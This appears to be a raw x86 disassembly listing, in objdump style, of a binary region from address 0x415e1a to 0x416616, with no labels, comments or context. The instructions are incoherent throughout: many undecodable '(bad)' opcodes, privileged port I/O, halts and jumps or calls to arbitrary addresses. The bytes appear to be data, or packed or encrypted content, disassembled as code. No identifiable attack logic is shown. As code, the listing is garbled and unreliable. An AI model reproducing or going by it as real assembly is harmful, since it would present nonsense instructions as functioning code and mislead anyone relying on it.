  415e1a:	jmp    0x681d16ee
  415e1f:	inc    edx
  415e20:	jne    0x415e9e
  415e22:	cmp    eax,0x59757926
  415e27:	cwde   
  415e28:	lea    ebx,[edi]
  415e2a:	inc    edx
  415e2b:	add    al,0xa8
  415e2d:	adc    esp,esi
  415e2f:	mov    al,BYTE PTR [eax+eax*8]
  415e32:	sub    al,BYTE PTR [edx+0x3c896eb6]
  415e38:	int3   
  415e39:	shr    DWORD PTR [ecx],0x77
  415e3c:	push   cs
  415e3d:	jecxz  0x415e8d
  415e3f:	dec    esp
  415e40:	out    0x33,al
  415e42:	lods   al,BYTE PTR ds:[esi]
  415e43:	ss sub eax,0x5ad0804d
  415e49:	push   ecx
  415e4a:	xchg   edx,eax
  415e4b:	adc    eax,0x9d1431f4
  415e50:	jecxz  0x415e2d
  415e52:	dec    ebx
  415e53:	nop
  415e54:	cld    
  415e55:	mov    DWORD PTR [edi],ecx
  415e57:	or     BYTE PTR [esp+ebx*2+0x72],dl
  415e5b:	hlt    
  415e5c:	loopne 0x415e0f
  415e5e:	mov    ch,BYTE PTR [ebx]
  415e60:	bound  ebx,QWORD PTR ds:0xc97aa9a3
  415e66:	hlt    
  415e67:	mov    ds:0xce15ed7f,al
  415e6c:	inc    ebp
  415e6d:	dec    ebp
  415e6e:	int3   
  415e6f:	int    0xa9
  415e71:	data16 ins BYTE PTR es:[edi],dx
  415e73:	push   edi
  415e74:	sbb    BYTE PTR [eax+0xc],0xca
  415e78:	loope  0x415ed6
  415e7a:	sub    esp,edi
  415e7c:	adc    ebp,DWORD PTR [ecx-0x4c]
  415e7f:	mov    ch,0x1d
  415e81:	hlt    
  415e82:	out    dx,al
  415e83:	adc    BYTE PTR [ebp+0x36280bc2],bh
  415e89:	cmp    DWORD PTR cs:[edi+0x77],esi
  415e8d:	outs   dx,DWORD PTR ds:[esi]
  415e8e:	lods   al,BYTE PTR ds:[esi]
  415e8f:	test   dh,dh
  415e91:	jle    0x415e15
  415e93:	jg     0x415ed8
  415e95:	cmp    al,0xa8
  415e97:	aaa    
  415e98:	xchg   ebx,eax
  415e99:	daa    
  415e9a:	mov    ch,0xee
  415e9c:	test   BYTE PTR ds:0x5dd2b02c,al
  415ea2:	mov    al,0x30
  415ea4:	int    0xc8
  415ea6:	ja     0x415efc
  415ea8:	and    DWORD PTR [ebp-0x74c94bf5],0x1c
  415eaf:	sub    DWORD PTR [edx+0x10],ecx
  415eb2:	and    eax,0xd7805424
  415eb7:	adc    al,0x46
  415eb9:	dec    BYTE PTR [edi]
  415ebb:	stos   DWORD PTR es:[edi],eax
  415ebc:	jge    0x415e77
  415ebe:	add    al,0x25
  415ec0:	xlat   BYTE PTR ds:[ebx]
  415ec1:	add    bh,BYTE PTR [edx-0x6426ea72]
  415ec7:	add    esi,ecx
  415ec9:	les    eax,FWORD PTR [ecx+0x58]
  415ecc:	xchg   edi,ecx
  415ece:	(bad)  
  415ecf:	or     al,0xd4
  415ed1:	jmp    0xca9b:0x4e3b8821
  415ed8:	lahf   
  415ed9:	inc    ecx
  415eda:	sbb    BYTE PTR [ebp+0xef71214],bl
  415ee0:	popa   
  415ee1:	fadd   st(2),st
  415ee3:	in     eax,dx
  415ee4:	push   ebp
  415ee5:	sub    DWORD PTR [esi-0xa],ebx
  415ee8:	or     DWORD PTR [edx-0x2e086b3f],eax
  415eee:	enter  0xa722,0x86
  415ef2:	popa   
  415ef3:	adc    al,BYTE PTR [edx-0x72e4928a]
  415ef9:	scas   eax,DWORD PTR es:[edi]
  415efa:	add    cl,ch
  415efc:	cs xor al,0x30
  415eff:	gs int 0x5f
  415f02:	int3   
  415f03:	ficomp WORD PTR [ebx-0xe]
  415f06:	xor    BYTE PTR [ebx-0x362e0de3],0x92
  415f0d:	pop    ss
  415f0e:	mov    ah,0x76
  415f10:	push   eax
  415f11:	mov    al,ah
  415f13:	push   ds
  415f14:	in     al,0xab
  415f16:	adc    bl,cl
  415f18:	xor    DWORD PTR [edx],ebx
  415f1a:	mov    BYTE PTR [edi],ah
  415f1c:	lea    esp,[esp+edx*8-0x75]
  415f20:	inc    esi
  415f21:	or     ebx,edi
  415f23:	mov    ah,0x53
  415f25:	mov    edx,0xdd4ad299
  415f2a:	(bad)  
  415f2b:	mov    bh,0xac
  415f2d:	(bad)  
  415f2f:	add    eax,0xd1d83dea
  415f34:	pop    ebp
  415f35:	loope  0x415f72
  415f37:	xor    esp,0xffffffe8
  415f3a:	into   
  415f3b:	faddp  st(3),st
  415f3d:	ds xchg esp,eax
  415f3f:	mov    ah,cl
  415f41:	lahf   
  415f42:	cmp    eax,0x80bc352c
  415f48:	and    eax,0xb05c40c4
  415f4d:	add    cl,BYTE PTR [esp+edi*4]
  415f50:	gs jno 0x415f25
  415f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f54:	mov    ah,0xbc
  415f56:	jo     0x415f65
  415f58:	jle    0x415fbf
  415f5a:	push   edx
  415f5b:	xor    eax,0x3cdbe52c
  415f60:	xor    eax,0x1e0345f1
  415f65:	push   ss
  415f66:	and    cl,bl
  415f68:	jnp    0x415fa7
  415f6a:	or     DWORD PTR ds:[ecx+0x64],0x421b1870
  415f72:	mov    ah,0xe
  415f74:	xlat   BYTE PTR ds:[ebx]
  415f75:	dec    edx
  415f76:	jl     0x415f3c
  415f78:	out    0xcc,eax
  415f7a:	mov    ebp,esi
  415f7c:	hlt    
  415f7d:	jecxz  0x415fb2
  415f7f:	test   eax,0x7f5ea059
  415f84:	or     esi,DWORD PTR [edx+0x94820bd]
  415f8a:	xchg   ebx,eax
  415f8b:	(bad)  
  415f8c:	cdq    
  415f8d:	push   edi
  415f8e:	push   cs
  415f8f:	pop    ebx
  415f90:	das    
  415f91:	jp     0x415fdf
  415f93:	inc    ecx
  415f94:	(bad)  
  415f95:	jmp    0x5239c631
  415f9a:	popf   
  415f9b:	xchg   edi,eax
  415f9c:	adc    dl,ah
  415f9e:	icebp  
  415f9f:	stc    
  415fa0:	iret   
  415fa1:	cmp    al,0x2c
  415fa3:	loop   0x415f28
  415fa5:	jmp    0xae8eee0
  415faa:	adc    bh,BYTE PTR [esi-0x3fa3dde0]
  415fb0:	sbb    BYTE PTR [ecx+0x4a5ea4cf],0x94
  415fb7:	sbb    dl,BYTE PTR [ebp+0x3d]
  415fba:	sbb    eax,eax
  415fbc:	xchg   ebp,eax
  415fbd:	(bad)  
  415fbe:	mov    ds:0xf926a8c8,eax
  415fc3:	stc    
  415fc4:	test   al,0x39
  415fc6:	dec    esi
  415fc7:	pushf  
  415fc8:	in     eax,dx
  415fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fca:	(bad)
  415fce:	sbb    al,0x42
  415fd0:	out    dx,al
  415fd1:	imul   eax,esi,0x38
  415fd4:	pushf  
  415fd5:	inc    ebx
  415fd6:	mov    ah,0x2d
  415fd8:	stos   DWORD PTR es:[edi],eax
  415fd9:	test   DWORD PTR [ebx],ebp
  415fdb:	stos   DWORD PTR es:[edi],eax
  415fdc:	sti    
  415fdd:	inc    eax
  415fde:	loopne 0x415f9b
  415fe0:	dec    eax
  415fe1:	mov    DWORD PTR [eax+0x7f],edi
  415fe4:	inc    eax
  415fe5:	mov    ah,al
  415fe7:	sbb    al,0xd3
  415fe9:	in     eax,0x71
  415feb:	jecxz  0x415fcb
  415fed:	mov    esp,ebp
  415fef:	pop    ecx
  415ff0:	ret    
  415ff1:	pop    ss
  415ff2:	xchg   BYTE PTR [eax-0x50],ch
  415ff5:	xchg   ecx,eax
  415ff6:	ja     0x41604d
  415ff8:	aaa    
  415ff9:	sar    BYTE PTR [edi+0x890402d],0xa4
  416000:	sahf   
  416001:	jmp    DWORD PTR [eax+0x5c530d49]
  416007:	dec    edi
  416008:	mov    ?,eax
  41600a:	iret   
  41600b:	jmp    0x41603a
  41600d:	mov    al,ds:0x49d7b886
  416012:	mov    eax,0x263da06c
  416017:	(bad)  [ebp-0x5cf8477a]
  41601d:	cmp    esp,ecx
  41601f:	push   edi
  416020:	or     cl,BYTE PTR [ebx]
  416022:	add    al,BYTE PTR ds:0x4a15ee6c
  416028:	jmp    0x9d3c:0x244e049
  41602f:	pop    ss
  416030:	scas   al,BYTE PTR es:[edi]
  416031:	bound  esi,QWORD PTR [ecx-0x46]
  416034:	mov    bh,0xf4
  416036:	mov    bh,0x50
  416038:	mov    edx,0xfdbbbc36
  41603d:	inc    esi
  41603e:	ja     0x41606e
  416040:	(bad)  
  416041:	xchg   esi,eax
  416042:	call   0x87ca:0xb62d349d
  416049:	dec    edx
  41604a:	out    0x13,al
  41604c:	mov    bl,0x67
  41604e:	xchg   esi,eax
  41604f:	push   ss
  416050:	mov    al,0xd8
  416052:	stos   DWORD PTR es:[edi],eax
  416053:	or     eax,DWORD PTR [ebx+0x7751962e]
  416059:	add    ecx,DWORD PTR [edx]
  41605b:	xor    al,BYTE PTR [ecx]
  41605d:	(bad)  
  41605e:	jp     0x416030
  416060:	or     dl,BYTE PTR [edi+0x37]
  416063:	fmul   QWORD PTR [edx+0x9cd3a16]
  416069:	mov    bl,0x15
  41606b:	loop   0x4160a2
  41606d:	mov    ds:0x13e7aa05,al
  416072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416073:	fistp  QWORD PTR ds:0x24f9232d
  416079:	lods   al,BYTE PTR ds:[esi]
  41607a:	xchg   DWORD PTR [eax],ebp
  41607c:	and    al,0xcf
  41607e:	test   eax,0xb06b690b
  416083:	adc    al,0x6b
  416085:	mov    WORD PTR [edi+0xe],ds
  416088:	(bad)  
  416089:	cmc    
  41608a:	dec    ebp
  41608b:	jns    0x41604e
  41608d:	add    DWORD PTR [edi],eax
  41608f:	and    BYTE PTR [edx],0xba
  416092:	jns    0x4160b5
  416094:	push   cs
  416095:	adc    DWORD PTR [edi+0x4f2f4a32],eax
  41609b:	imul   eax,DWORD PTR [ebp+0x7715ed26],0x68fa1200
  4160a5:	jge    0x41605f
  4160a7:	pop    esi
  4160a8:	aas    
  4160a9:	push   ds
  4160aa:	pop    es
  4160ab:	mov    ss,WORD PTR [eax]
  4160ad:	sub    eax,0xaebf16f0
  4160b2:	or     DWORD PTR [ecx+0xd],ebx
  4160b5:	call   FWORD PTR ds:0x1ade0b4d
  4160bb:	sbb    al,0x24
  4160bd:	mov    fs,edx
  4160bf:	mov    bl,0x73
  4160c1:	sub    dh,BYTE PTR [ebp-0x1460f09d]
  4160c7:	push   ecx
  4160c8:	and    BYTE PTR [esi],ch
  4160ca:	stos   BYTE PTR es:[edi],al
  4160cb:	(bad)  
  4160cd:	dec    esp
  4160ce:	cs icebp 
  4160d0:	sbb    al,0xf8
  4160d2:	mov    dh,0x1f
  4160d4:	mov    bl,0x41
  4160d6:	mov    ebx,0xae7cdac2
  4160db:	add    al,BYTE PTR [esi]
  4160dd:	call   0xe3911985
  4160e2:	test   DWORD PTR [ecx+0x4769d35b],0x69370658
  4160ec:	ds jecxz 0x416087
  4160ef:	push   edi
  4160f0:	icebp  
  4160f1:	bound  esp,QWORD PTR [edi+0x2b]
  4160f4:	cmp    eax,0x571b3828
  4160f9:	in     eax,0x5c
  4160fb:	outs   dx,DWORD PTR ds:[esi]
  4160fc:	or     al,0x6c
  4160fe:	lock cmp edx,DWORD PTR [esi+0x75]
  416102:	ins    DWORD PTR es:[di],dx
  416104:	cmc    
  416105:	cwde   
  416106:	push   cs
  416107:	push   esi
  416108:	xor    ah,al
  41610a:	push   ss
  41610b:	call   0x1868ccde
  416110:	mov    bh,0x86
  416112:	sbb    esi,DWORD PTR [edx-0x615760a9]
  416118:	daa    
  416119:	imul   eax,DWORD PTR [eax],0x1d
  41611c:	cmp    edi,eax
  41611e:	mov    esp,0xbbe4f81c
  416123:	fs nop
  416125:	jne    0x41614c
  416127:	or     bh,BYTE PTR [ebp-0x63]
  41612a:	fwait
  41612b:	add    BYTE PTR [edx+0x6b],ah
  41612e:	jo     0x416121
  416130:	xor    DWORD PTR [ebp-0x3bffc5e8],esp
  416136:	sub    eax,0x3fc7e0be
  41613b:	call   0xf598b6e6
  416140:	(bad)  
  416141:	es inc esp
  416143:	retf   0x882a
  416146:	repz test eax,0xc3bc3210
  41614c:	jl     0x416149
  41614e:	imul   BYTE PTR ds:0xac3b1a61
  416154:	xor    BYTE PTR [esi-0x52],al
  416157:	inc    esp
  416158:	inc    esp
  416159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41615a:	push   cs
  41615b:	jmp    0x8316:0x2a77739d
  416162:	push   ss
  416163:	loopne 0x4161a2
  416165:	dec    edi
  416166:	jmp    0xa5abe809
  41616b:	dec    edi
  41616c:	cdq    
  41616d:	pop    es
  41616e:	div    BYTE PTR [ebp-0x23963618]
  416174:	hlt    
  416175:	leave  
  416176:	and    dl,BYTE PTR [ecx+ebx*8]
  416179:	scas   eax,DWORD PTR es:[edi]
  41617a:	sub    DWORD PTR [eax+0x1e],edx
  41617d:	aam    0xce
  41617f:	(bad)  
  416181:	test   eax,eax
  416183:	mov    ecx,0xb26cb2a2
  416188:	inc    edx
  416189:	nop
  41618a:	xchg   edi,eax
  41618b:	dec    eax
  41618c:	shl    DWORD PTR [esi+ebp*8+0x4c31ddfc],cl
  416193:	sar    BYTE PTR ss:[eax+0xe],1
  416197:	pop    ds
  416198:	pop    ebx
  416199:	paddsw mm3,QWORD PTR [edx+0x3e]
  41619d:	fisttp DWORD PTR [ecx]
  41619f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161a0:	xchg   edi,eax
  4161a1:	cmp    esi,DWORD PTR [eax]
  4161a3:	fistp  WORD PTR [ecx+0x5]
  4161a6:	mov    bl,0x3d
  4161a8:	out    0xe0,eax
  4161aa:	jbe    0x416136
  4161ac:	jmp    0xb671:0xb52dfd98
  4161b3:	mov    esp,DWORD PTR [ecx-0x31]
  4161b6:	clc    
  4161b7:	mov    dl,0x15
  4161b9:	shr    DWORD PTR [edi+0x4b],cl
  4161bc:	mov    al,0x4e
  4161be:	jb     0x4161ec
  4161c0:	stos   BYTE PTR es:[edi],al
  4161c1:	call   0x9a7d8638
  4161c6:	push   esp
  4161c7:	test   DWORD PTR [edx-0x9bf8452],0xe8c1e2c5
  4161d1:	lods   al,BYTE PTR ds:[esi]
  4161d2:	or     al,0x56
  4161d4:	lods   eax,DWORD PTR ds:[esi]
  4161d5:	jl     0x416245
  4161d7:	dec    ebp
  4161d8:	inc    esp
  4161d9:	test   edi,0xe3307436
  4161df:	jne    0x41625d
  4161e1:	mov    ?,esi
  4161e3:	test   eax,0xfcc0f5e3
  4161e8:	push   edx
  4161e9:	shr    DWORD PTR [esi+0x9],1
  4161ec:	imul   BYTE PTR [ecx]
  4161ee:	aas    
  4161ef:	or     eax,0x552f81e
  4161f4:	sahf   
  4161f5:	pop    eax
  4161f6:	ds sub bl,dl
  4161f9:	xchg   ebp,eax
  4161fa:	stc    
  4161fb:	iret   
  4161fc:	or     esp,DWORD PTR [ecx-0x626df974]
  416202:	push   eax
  416203:	lods   al,BYTE PTR ds:[esi]
  416204:	jne    0x416190
  416206:	imul   esp,DWORD PTR [eax+0xcce60a7],0x5a
  41620d:	fisttp QWORD PTR [ebp-0x35]
  416210:	mov    cl,0xb2
  416212:	ja     0x416245
  416214:	lds    eax,FWORD PTR cs:[ecx+0x62fe6b77]
  41621b:	and    al,0x3e
  41621d:	loope  0x4161aa
  41621f:	xchg   BYTE PTR [ecx],cl
  416221:	es pop esi
  416223:	mov    al,ds:0xebda7fc8
  416228:	dec    ecx
  416229:	and    bl,cl
  41622b:	or     al,0x6d
  41622d:	(bad)  
  41622e:	cwde   
  41622f:	mov    al,0xe1
  416231:	xchg   ebx,ecx
  416233:	idiv   esi
  416235:	push   esi
  416236:	jge    0x416298
  416238:	aad    0xa2
  41623a:	pop    ds
  41623b:	xchg   ecx,eax
  41623c:	int    0x3c
  41623e:	push   ss
  41623f:	(bad)  
  416240:	icebp  
  416241:	rcl    BYTE PTR [ebx],cl
  416243:	out    0x26,al
  416245:	mov    ?,WORD PTR [ebx+0x18]
  416248:	sbb    al,0x40
  41624a:	int    0xec
  41624c:	push   es
  41624d:	sub    esp,DWORD PTR [ecx]
  41624f:	push   ds
  416250:	(bad)  
  416251:	cmp    BYTE PTR [ecx],ch
  416253:	adc    ah,BYTE PTR [edi]
  416255:	xchg   esp,eax
  416256:	pop    ebp
  416257:	in     eax,0x88
  416259:	push   eax
  41625a:	loop   0x416232
  41625c:	psubd  mm7,QWORD PTR [eax+edx*1]
  416260:	inc    esp
  416261:	in     al,dx
  416262:	and    dh,BYTE PTR [edx-0x53dc82da]
  416268:	aam    0xf2
  41626a:	mov    ebp,edi
  41626c:	or     eax,0x27312eba
  416271:	and    eax,0x32135d21
  416276:	dec    eax
  416277:	jbe    0x4162dc
  416279:	cmp    al,0x27
  41627b:	mov    edi,0x5d94f1d7
  416280:	xchg   BYTE PTR [ebx+0x49],dh
  416283:	jbe    0x416267
  416285:	mov    bh,0x15
  416287:	test   eax,0xc3e359ca
  41628c:	adc    DWORD PTR [eax+0x5e40a0e4],eax
  416292:	mov    cl,0x7b
  416294:	jp     0x416301
  416296:	and    eax,0x52919a45
  41629b:	push   ds
  41629c:	stc    
  41629d:	mov    ds:0xef987594,al
  4162a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162a3:	push   cs
  4162a4:	xor    eax,0x7062d16c
  4162a9:	stos   BYTE PTR es:[edi],al
  4162aa:	fisub  DWORD PTR [ebp+ebp*8+0x1e7fb585]
  4162b1:	mov    eax,ds:0xb28ad87f
  4162b6:	add    al,0x5e
  4162b8:	loop   0x4162ac
  4162ba:	mov    esi,0xeb2c558c
  4162bf:	fnsave [ebp+ecx*1+0x6f]
  4162c3:	mov    esi,0x75c571fc
  4162c8:	cmp    eax,0xed894dc7
  4162cd:	mov    edx,0x2ddc25be
  4162d2:	jno    0x4162fe
  4162d4:	aam    0xe6
  4162d6:	pop    esp
  4162d7:	cwde   
  4162d8:	jae    0x416315
  4162da:	or     eax,0x2dd8c8b6
  4162df:	and    DWORD PTR [edx-0x604548e9],edx
  4162e5:	pop    ebp
  4162e6:	sbb    al,0x7e
  4162e8:	mov    al,0x33
  4162ea:	cmp    al,0x14
  4162ec:	popf   
  4162ed:	inc    edx
  4162ee:	cdq    
  4162ef:	mov    ah,BYTE PTR [edi+0x53]
  4162f2:	popa   
  4162f3:	mul    bh
  4162f5:	(bad)  
  4162f6:	outs   dx,BYTE PTR ds:[esi]
  4162f7:	js     0x41630a
  4162f9:	rol    DWORD PTR [ebx+ecx*1+0x1ea9253b],0xa1
  416301:	cmp    DWORD PTR [esi-0x3ec9dfb7],eax
  416307:	pop    esp
  416308:	mov    eax,0x8bf7e514
  41630d:	sub    bx,bx
  416310:	loopne 0x41637f
  416312:	(bad)  
  416313:	movups xmm5,xmm3
  416316:	sbb    DWORD PTR [ebp-0x2d],0x27
  41631a:	sub    eax,0x8ea6d6b9
  41631f:	xchg   BYTE PTR [ecx-0x19],ch
  416322:	xchg   ebx,eax
  416323:	sbb    BYTE PTR [edx],bl
  416325:	shl    dl,1
  416327:	in     al,0x76
  416329:	cmp    DWORD PTR [ecx-0x3c7ee2da],esp
  41632f:	xor    ah,BYTE PTR [ebp-0x45161c01]
  416335:	rcl    DWORD PTR [ecx-0x6b],1
  416338:	inc    eax
  416339:	(bad)  
  41633a:	mov    esp,0x4e1b6b7b
  41633f:	push   ebx
  416340:	cli    
  416341:	cmp    BYTE PTR [esi+0x53],ch
  416344:	(bad)  
  416345:	jmp    0xe176:0x26814ffa
  41634c:	nop
  41634d:	dec    ebx
  41634e:	test   eax,ecx
  416350:	pop    ecx
  416351:	adc    dl,dh
  416353:	dec    esp
  416354:	adc    ah,BYTE PTR [edi-0x7e]
  416357:	pop    esp
  416358:	popf   
  416359:	mov    ch,0xa7
  41635b:	pop    eax
  41635c:	add    BYTE PTR [edx+ebp*8+0x61a5cac6],cl
  416363:	into   
  416364:	xor    ebx,DWORD PTR [esi+0x5]
  416367:	test   eax,0xcea6dec4
  41636c:	ins    BYTE PTR es:[edi],dx
  41636d:	jns    0x416359
  41636f:	ror    bh,0x1b
  416372:	fcom   DWORD PTR [ebx+0x12]
  416375:	in     al,dx
  416376:	fild   QWORD PTR [ecx+0x66]
  416379:	adc    al,0xcd
  41637b:	int    0xf0
  41637d:	out    dx,eax
  41637e:	das    
  41637f:	and    BYTE PTR [eax],al
  416381:	mov    esp,0x324face9
  416386:	js     0x4163c7
  416388:	rcr    DWORD PTR [ebp+0x6861d193],cl
  41638e:	add    al,0x3c
  416390:	fiadd  WORD PTR [edx-0x39dd4f1]
  416396:	inc    ecx
  416397:	mov    BYTE PTR [ebx-0x74563c8d],al
  41639d:	stos   DWORD PTR es:[edi],eax
  41639e:	ds push 0x8c6b17ba
  4163a4:	pop    eax
  4163a5:	fmul   st(1),st
  4163a7:	les    eax,FWORD PTR [esi+0x5ddf2d2f]
  4163ad:	and    eax,0xee786e1b
  4163b2:	ret    
  4163b3:	jne    0x4163bf
  4163b5:	sub    BYTE PTR ds:0x25cd3a69,0x6e
  4163bc:	mul    BYTE PTR [edx]
  4163be:	shl    BYTE PTR [ebx],cl
  4163c0:	out    0x1c,eax
  4163c2:	sar    ebx,cl
  4163c4:	push   ds
  4163c5:	and    ecx,ebp
  4163c7:	iret   
  4163c8:	pop    edx
  4163c9:	jmp    0x4163fb
  4163cb:	cmp    BYTE PTR [edi+ecx*2-0x15],0xa2
  4163d0:	inc    edx
  4163d1:	out    dx,eax
  4163d2:	cmp    eax,0x3fd5ac0b
  4163d7:	loope  0x41644a
  4163d9:	inc    eax
  4163da:	jae    0x41639b
  4163dc:	in     al,dx
  4163dd:	mov    WORD PTR [ecx+0x75c77f52],ds
  4163e3:	into   
  4163e4:	cwde   
  4163e5:	adc    ebx,edi
  4163e7:	push   ebp
  4163e8:	sbb    DWORD PTR [edi+0x2f],edi
  4163eb:	iret   
  4163ec:	cmc    
  4163ed:	stos   BYTE PTR es:[edi],al
  4163ee:	push   edi
  4163ef:	lods   al,BYTE PTR ds:[esi]
  4163f0:	xor    al,0xc0
  4163f2:	scas   al,BYTE PTR es:[edi]
  4163f3:	push   esp
  4163f4:	sub    eax,0x4f09df9a
  4163f9:	cmc    
  4163fa:	and    ebp,0xfffffff4
  4163fd:	xchg   edi,eax
  4163fe:	dec    esi
  4163ff:	mov    esi,0x56b3b3f4
  416404:	and    eax,0x5f42933a
  416409:	loopne 0x4163dd
  41640b:	jle    0x4163d3
  41640d:	add    DWORD PTR [ebp+0x12c94a2],esi
  416413:	in     al,0xdc
  416415:	int3   
  416416:	mov    ah,0xf
  416418:	or     eax,ecx
  41641a:	sub    al,0x34
  41641c:	les    edi,FWORD PTR cs:[edi-0x64131e02]
  416423:	popf   
  416424:	sbb    bh,ah
  416426:	call   0x227c5875
  41642b:	je     0x41641f
  41642d:	and    BYTE PTR [ebp-0x226bdc49],bl
  416433:	pop    ss
  416434:	inc    esi
  416435:	addr16 das 
  416437:	sbb    al,0x3c
  416439:	sub    DWORD PTR [eax+eiz*4+0x4fdee0ee],edi
  416440:	and    DWORD PTR [edi],esp
  416442:	xor    bh,0xc6
  416445:	or     eax,DWORD PTR [esi]
  416447:	loop   0x416486
  416449:	hlt    
  41644a:	and    DWORD PTR [esi-0x39],eax
  41644d:	mov    al,ds:0x255e6acb
  416452:	cmp    esi,DWORD PTR [edx-0x674f1c92]
  416458:	retf   
  416459:	les    eax,FWORD PTR [ebx+0x5d1856fd]
  41645f:	mov    cs,WORD PTR [ebx]
  416461:	sub    ebp,0xaaf87542
  416467:	enter  0xb85c,0xa7
  41646b:	push   0xfdf95070
  416470:	ficomp DWORD PTR [edx]
  416472:	stc    
  416473:	inc    eax
  416474:	loop   0x416452
  416476:	push   ecx
  416477:	jo     0x416459
  416479:	jns    0x4164d7
  41647b:	fstp   QWORD PTR [edi]
  41647d:	mov    cl,0xaa
  41647f:	imul   ecx,DWORD PTR [ecx+0x3d],0x7b
  416483:	sbb    eax,0x395e7427
  416488:	cmp    al,0x35
  41648a:	and    bl,BYTE PTR [edi-0x6ad35377]
  416490:	sahf   
  416491:	outs   dx,DWORD PTR ds:[esi]
  416492:	push   edx
  416493:	js     0x4164bc
  416495:	xor    eax,0xf5c3e1
  41649a:	ja     0x4164f2
  41649c:	sub    BYTE PTR [ebp-0x4483e649],al
  4164a2:	push   0x9fc7faa8
  4164a7:	retf   
  4164a8:	mov    dh,0x98
  4164aa:	mov    bl,0xb9
  4164ac:	pop    esp
  4164ad:	ret    0x4cae
  4164b0:	sub    eax,0x831a2769
  4164b5:	aam    0x70
  4164b7:	shl    edi,cl
  4164b9:	xchg   esp,eax
  4164ba:	xchg   edx,eax
  4164bb:	test   cl,bh
  4164bd:	mov    ebp,DWORD PTR [esi]
  4164bf:	dec    eax
  4164c0:	cmp    eax,0x7e58d07e
  4164c5:	sbb    dh,BYTE PTR [edi+0x2b654c1c]
  4164cb:	inc    ebx
  4164cc:	lock dec edx
  4164ce:	aas    
  4164cf:	mov    edx,DWORD PTR [ecx+0x7c]
  4164d2:	pushf  
  4164d3:	push   eax
  4164d4:	ret    0x613b
  4164d7:	xor    esi,esp
  4164d9:	mov    DWORD PTR [edi+0x6fdb6a0d],ecx
  4164df:	adc    edi,DWORD PTR [ebx+0x1f18aaa0]
  4164e5:	call   0x2a40072b
  4164ea:	sahf   
  4164eb:	lock sub eax,0xddae7ce9
  4164f1:	jge    0x416557
  4164f3:	or     esp,DWORD PTR [ebp-0x117b495]
  4164f9:	js     0x416523
  4164fb:	xor    BYTE PTR [edx-0x643f7833],dh
  416501:	popf   
  416502:	xchg   edi,eax
  416503:	and    BYTE PTR [edx],bl
  416505:	lahf   
  416506:	and    al,0x4b
  416508:	mov    ecx,0x349d98d0
  41650d:	ins    BYTE PTR es:[edi],dx
  41650e:	mov    bh,BYTE PTR [ebx-0x2b7cba86]
  416514:	into   
  416515:	or     dh,BYTE PTR [ecx]
  416517:	xor    ah,ah
  416519:	lock push 0x698166
  41651f:	jbe    0x41657e
  416521:	mov    edx,0x40f88680
  416526:	mov    gs,ebp
  416528:	add    al,BYTE PTR [eax+0x47c756b8]
  41652e:	jno    0x416500
  416530:	jno    0x416502
  416532:	add    eax,DWORD PTR [ebp+ebp*2-0x3f]
  416536:	es pop edi
  416538:	mov    ds:0xab2c9776,eax
  41653d:	cmp    esp,DWORD PTR ds:0xdfa6c9a
  416543:	cld    
  416544:	mov    al,0x11
  416546:	mov    WORD PTR [esi-0x76],?
  416549:	jb     0x4165bf
  41654b:	jns    0x4165a5
  41654d:	sahf   
  41654e:	out    dx,eax
  41654f:	pop    ecx
  416550:	mov    ah,0xa9
  416552:	push   0xbc556373
  416557:	sub    edx,DWORD PTR [ecx]
  416559:	mov    ebx,0x8f5c1efb
  41655e:	push   esi
  41655f:	inc    eax
  416560:	adc    eax,0x2e35c77a
  416565:	mov    al,0x61
  416567:	adc    BYTE PTR [esi],bh
  416569:	push   esp
  41656a:	sbb    al,0x17
  41656c:	adc    bh,BYTE PTR [eax+0x31670445]
  416572:	lods   al,BYTE PTR ds:[esi]
  416573:	into   
  416574:	cmp    BYTE PTR [ecx+0x27],ah
  416577:	cs in  eax,dx
  416579:	outs   dx,BYTE PTR ds:[esi]
  41657a:	push   es
  41657b:	push   ss
  41657c:	xchg   edi,esi
  41657e:	push   0x19fdde47
  416583:	jo     0x4165de
  416585:	and    BYTE PTR [edi+ebp*8],ch
  416588:	js     0x41654c
  41658a:	push   eax
  41658b:	aas    
  41658c:	and    bh,ah
  41658e:	rcl    DWORD PTR [eax+0x49],1
  416591:	dec    esi
  416592:	cld    
  416593:	pop    ebp
  416594:	loope  0x416573
  416596:	and    DWORD PTR [esi+0xeee0048],edx
  41659c:	sub    BYTE PTR [ebx-0x6d],0x76
  4165a0:	mov    ebx,0xd4d320a
  4165a5:	push   ds
  4165a6:	pop    ecx
  4165a7:	clc    
  4165a8:	int    0x51
  4165aa:	addr16 leave 
  4165ac:	adc    al,0xe3
  4165ae:	add    DWORD PTR [esi+0x26],ebx
  4165b1:	sahf   
  4165b2:	or     DWORD PTR [ebx+0x64],0x75
  4165b6:	loopne 0x416542
  4165b8:	lods   ax,WORD PTR ds:[esi]
  4165ba:	ss add al,0xba
  4165bd:	lock cs ds mov eax,0x19037924
  4165c5:	mov    edx,eax
  4165c7:	inc    ebx
  4165c8:	inc    edx
  4165c9:	mov    bl,0x52
  4165cb:	leave  
  4165cc:	pushf  
  4165cd:	cli    
  4165ce:	xchg   DWORD PTR [esi-0x757035e1],ebp
  4165d4:	dec    ebx
  4165d5:	or     BYTE PTR [eax+edi*4-0x10],ah
  4165d9:	mov    DWORD PTR [edi],0x8704e187
  4165df:	sbb    al,0x9e
  4165e1:	xchg   ebp,eax
  4165e2:	outs   dx,BYTE PTR ds:[esi]
  4165e3:	in     eax,0x12
  4165e5:	mov    ds:0x60be8efa,eax
  4165ea:	ja     0x416610
  4165ec:	mov    al,0x5b
  4165ee:	in     al,0xdd
  4165f0:	and    ah,BYTE PTR [ebx]
  4165f2:	mov    dl,0x4a
  4165f4:	neg    bh
  4165f6:	or     dh,dl
  4165f8:	mov    edi,0xcd80de46
  4165fd:	mov    ch,0x42
  4165ff:	and    DWORD PTR gs:[ecx+0x17],edx
  416603:	pop    ebp
  416604:	jnp    0x4165d7
  416606:	scas   eax,DWORD PTR es:[edi]
  416607:	add    al,dh
  416609:	fwait
  41660a:	inc    DWORD PTR [edx+0x4]
  41660d:	test   BYTE PTR [ebx],cl
  41660f:	fistp  DWORD PTR [esp+ebp*2-0x4a]
  416613:	ret    
  416614:	sbb    bh,al
  416616:	pop    ss
